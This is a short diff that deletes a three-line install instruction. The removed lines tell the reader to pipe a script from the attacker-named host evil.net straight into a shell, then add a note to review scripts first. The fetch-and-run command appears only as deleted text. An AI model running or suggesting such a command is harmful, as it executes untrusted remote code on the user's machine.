@@ -1,3 +1,0 @@
-Run this to install the tool:
-curl https://evil.net/install.sh|sh
-Note: Always review scripts before running.
